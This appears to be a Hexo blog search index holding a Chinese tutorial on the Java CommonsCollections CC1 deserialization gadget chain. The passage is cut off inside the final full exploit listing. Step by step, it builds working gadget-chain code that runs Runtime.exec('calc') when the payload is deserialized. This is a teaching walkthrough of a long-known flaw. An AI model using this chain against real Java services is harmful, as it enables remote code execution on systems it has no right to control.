<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java反序列化CommonsCollections篇-CC1</title>
    <url>/2024/05/23/JAVA%E5%AE%89%E5%85%A8/CC1/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>JAVA版本8u65</p>
</li>
<li><p>commons-collections 3.2.1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Common-Collections-介绍"><a href="#Common-Collections-介绍" class="headerlink" title="Common-Collections 介绍"></a>Common-Collections 介绍</h2><p><a href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">Apache Commons Collections包和简介</a></p>
<ul>
<li><p><code>org.apache.commons.collections</code> – CommonsCollections自定义的一组公用的接口和工具类</p>
</li>
<li><p><code>org.apache.commons.collections.bag</code> – 实现Bag接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.bidimap</code> – 实现BidiMap系列接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.buffer</code> – 实现Buffer接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.collection</code> –实现java.util.Collection接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.comparators</code>– 实现java.util.Comparator接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.functors</code> –Commons Collections自定义的一组功能类</p>
</li>
<li><p><code>org.apache.commons.collections.iterators</code> – 实现java.util.Iterator接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.keyvalue</code> – 实现集合和键&#x2F;值映射相关的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.list</code> – 实现java.util.List接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.map</code> – 实现Map系列接口的一组类</p>
</li>
<li><p><code>org.apache.commons.collections.set</code> – 实现Set系列接口的一组类</p>
</li>
</ul>
<h2 id="攻击链分析"><a href="#攻击链分析" class="headerlink" title="攻击链分析"></a>攻击链分析</h2><h3 id="寻找尾部"><a href="#寻找尾部" class="headerlink" title="寻找尾部"></a>寻找尾部</h3><p>通过<a href="https://github.com/frohoff/ysoserial">ysoserial</a>可以看到危险方法是<code>InvokerTransformer . transform()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521163436805.png" alt="image-20240521163436805"></p>
<p>我们试着用漏洞发现作者的视角来调试代码，作者首先找到了<code>Transformer</code>接口，接口有<code>transform()</code>方法。</p>
<p>有21个实现方法(包含了主角儿<code>InvokerTransformer</code>)，找到的<code>InvokerTransformer.transform()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521222016548.png" alt="image-20240521222016548"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521223049332.png" alt="image-20240521223049332"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  <span class="comment">//接受一个对象</span></span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();  <span class="comment">//反射</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);     <span class="comment">//方法，参数类型，参数，都可控</span></span><br><span class="line">                </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>这就可以作为我们这条链的尾部。</p>
<p>尝试用这个方法去弹计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//普通弹计算器写法</span></span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//反射写法</span></span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    Class&lt;Runtime&gt; c = Runtime.class;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">    exec.invoke(r, <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//InvokerTransformer.transform写法</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为什么写<code> new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></p>
<p>首先，我们确认<code>InvokerTransformer.transform()</code>因为参数可控，可以调用任意方法。<code>transform()</code>需要传入的是一个对象,所以传入对象Runtime对象；</p>
<p>接下来看InvokerTransformer的构造方法，第一个参数，方法名（String类型），所以填入”exec”；</p>
<p>第二个参数，参数类型（Class数组），”exec”接受一个 <code>String</code> 类型所以填入new Class[]{String.class}；</p>
<p>第三个参数，参数值（Object数组），所以填入new Object[]{“calc”})；</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521225147161.png" alt="image-20240521225147161"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240521225202458.png" alt="image-20240521225202458"></p>
<p>下一步的目标是去找调用 <code>transform()</code> 方法的不同名函数。</p>
<h3 id="寻找调用链"><a href="#寻找调用链" class="headerlink" title="寻找调用链"></a>寻找调用链</h3><p>按住alt+f7寻找哪些函数调用了，<code>transform()</code>方法,看到有21个调用<img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240522210518321.png" alt="image-20240522210518321"></p>
<p>我们目标是找到一个不同名方法调用了<code>transform()</code>方法，相当与让调用链往前走一步，最终我们呢找到了<code>TransformdMap. checkSetValue()</code>调用了<code>transform()</code><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240522211955793.png" alt="image-20240522211955793"></p>
<p>单独把这几段代码放出来解释一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//TransformedMap继承了AbstractInputCheckedMapDecorator 并实现了 Serializable 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span>   </span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//keyTransformer 和 valueTransformer 的类型是Transformer，这表明它们是对象，而不是基本数据类型或局部变量。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7023152376788900464L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;  </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">	<span class="comment">//decorate 方法是一个静态工厂方法，接受一个Map和两个Transformer对象，返回一个经过转换的Map。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">	<span class="comment">// 构造函数接受一个Map和两个Transformer对象，并调用父类构造函数super(map)来初始化基类部分，同时初始化 	keyTransformer 和 valueTransformer 成员变量。</span></span><br><span class="line">  	<span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">	<span class="comment">//checkSetValue 方法用于在设置值时对值进行转换。它通过调用 valueTransformer 的 transform 方法将传入的值转换成目标值。</span></span><br><span class="line">	<span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为decorate是一个静态方法所以可以直接使用<code>TransformedMap.decorate</code>;</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523095834788.png" alt="image-20240523095834788"></p>
<p>接下来就找谁调用了<code>checkSetValue()</code>,发现就一个调用，<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>。是<code>TransformedMap</code>的父类，发现其实<code>AbstractInputCheckedMapDecorator.setValue()</code>是重写了Entry遍历的写法。那只要有一个类遍历Entry就可以走进<code>setValue</code>。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240522222342135.png" alt="image-20240522222342135"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        </span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;</span><br><span class="line">            entry.setValue(r);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以试着调试一些这段代码</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523000545804.png" alt="image-20240523000545804"></p>
<p>首先进入到<code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code>，parent为<code>TransformedMap</code>对象。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523090042519.png" alt="image-20240523090042519"></p>
<p>然后进入到<code>TransformedMap.checkSetValue</code>;vulueTransformer为<code>InvokerTransformer</code>对象</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523000632982.png" alt="image-20240523000632982"></p>
<p>然后进入了<code>InvokerTransformer.transform</code>;调用了<code>invoke()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523092438757.png" alt="image-20240523092438757"></p>
<p>捋捋调用链</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523102559433.png" alt="image-20240523102559433"></p>
<h3 id="链首"><a href="#链首" class="headerlink" title="链首"></a>链首</h3><p>上面已经证明了我们找的利用链有效，现在再往上级找，找谁调用了<code>setValue()</code>,最终找到了<code>AnnotationInvocationHandler.readObject()</code>调用了<code>setValue()</code>。所以就可以当链首。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523105916973.png" alt="image-20240523105916973"></p>
<h2 id="TransformMap版CC1"><a href="#TransformMap版CC1" class="headerlink" title="TransformMap版CC1"></a>TransformMap版CC1</h2><p>调用链</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523204418229.png" alt="image-20240523204418229"></p>
<p>因为<code>AnnotationInvocationHandler</code>不是public方法，所以只能通过反射创建</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523104354658.png" alt="image-20240523104354658"></p>
<p>反射写法没什么好说的。</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523151140450.png" alt="image-20240523151140450"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//反射获取AnnotationInvocationHandler</span></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhdlConstructor.newInstance(Override.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        SER(o);</span><br><span class="line">        UNSER(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SER</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">UNSER</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="三个问题"><a href="#三个问题" class="headerlink" title="三个问题"></a>三个问题</h3><ol>
<li><p>Runtime并不能序列化</p>
</li>
<li><p>这个循环体不知道是否能进去</p>
</li>
<li><p><code>AnnotationInvocationHandler.readObject() </code>for循环中是<code>new AnnotationTypeMismatchExceptionProxy</code>并不是我们想要的Runtime类</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523152522150.png" alt="image-20240523152522150"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523151954472.png" alt="image-20240523151954472"></p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523151920747.png" alt="image-20240523151920747"></p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>解决问题一：虽然Runtime不可以序列化，但是Runtime.class可以</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射获取Runtime对象</span></span><br><span class="line">Class&lt;Runtime&gt; c = Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        execMethod.invoke(r, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">     <span class="comment">//根据InvokerTransformer().transform()编写，相当于用这一串代码，实现上面的代码</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line">      <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解决问题二：</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523192532159.png" alt="image-20240523192532159"> </p>
<p>分析一下这段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);  <span class="comment">//这里的type就是我们刚刚传入的Override.class</span></span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();     <span class="comment">//获取成员方法，也就是获取Override的成员方法</span></span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name); <span class="comment">//查找成员方法</span></span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  	<span class="comment">//但是Override并没有值，所以根本走不到下面的判断，也就调用不了setValue()</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<p>改写自己的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);</span></span><br><span class="line"><span class="comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span></span><br><span class="line"><span class="comment">//这段的代码可以通过ChainedTransformer链式调用改写。</span></span><br><span class="line">        </span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//key改为Target的成员方法</span></span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">		</span><br><span class="line">        </span><br><span class="line">        Class&lt;?&gt; c = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationdhdlConstructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationdhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//这里改为Target.class</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class, transformerMap );</span><br><span class="line"></span><br><span class="line">        SER(o);</span><br><span class="line">        UNSER(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SER</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">UNSER</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解决问题三：</p>
<p><code>ConstantTransformer.transform</code>相当于传入什么就返回什么，这就很方便我们了，我们可以传入(Runtime.class)</p>
<p><img src="https://raw.githubusercontent.com/Sp4rks3/HexoPicgoJpg/main/image-20240523194708176.png" alt="image-20240523194708176"></p>
<p>完整代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span 